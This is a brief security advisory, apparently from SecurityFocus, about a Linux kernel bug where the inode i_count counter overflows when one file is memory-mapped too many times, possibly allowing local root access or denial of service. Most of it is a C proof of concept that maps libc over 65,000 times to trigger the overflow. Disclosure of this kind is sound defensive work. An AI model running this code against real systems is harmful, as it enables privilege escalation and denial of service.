source: http://www.securityfocus.com/bid/388/info

The i_count member in the Linux inode structure is an unsigned short integer. It can be overflowed by mapping a single file too many times, allowing for a local user to possibly gain root access on the target machine or cause a denial of service.

Below is a short example of how this vulnerability can be exploited:

#include <unistd.h> 
#include <fcntl.h>

#include <sys/mman.h>

void main()

{

int fd, i;

fd = open("/lib/libc.so.5", O_RDONLY);

for(i = 0; i < 65540; i++)

{

mmap((char*)0x50000000 + (0x1000 * i), 0x1000,

PROT_READ, MAP_SHARED | MAP_FIXED, fd, 0);

}

}

